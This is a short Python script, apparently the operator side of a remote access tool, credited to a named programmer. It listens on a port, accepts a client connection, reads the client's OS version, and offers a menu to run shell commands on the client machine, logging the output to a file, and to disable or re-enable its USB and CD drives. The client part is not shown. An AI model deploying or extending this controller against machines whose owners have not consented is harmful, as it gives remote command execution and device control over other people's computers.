# Programmer Milad Taleb

import socket

s = socket.socket(2, 1)

s.bind(("localhost", 5645))
s.listen(5)

print("connected to port", 5645,"\n")

c, addre = s.accept()
print("connected to address", addre, "\n")

while True:
    os_version = c.recv(1024).decode()
    print("\n\nClient OS version is ",os_version,"\n")
    print("\n1.Access to client shell\n2.Turn off USB and CD drive\n3.Turn on USB and CD drive\n4.Exit")
    choose = input("Please enter your choice: ")
    c.sendall(choose.encode())
    
    if choose == '1':
        input_r = input("Shell# ")
        c.sendall(input_r.encode())
        result = c.recv(1024).decode()
        print(result)
        f = open("\\result.txt","a")
        f.write(result)
        f.close()
    elif choose == '2':
        result = c.recv(1024).decode()
        print(result)
    elif choose == '3':
        result = c.recv(1024).decode()
        print(result)
    elif choose == '4':
        break
    else:
        print("your input is wrong")

s.close()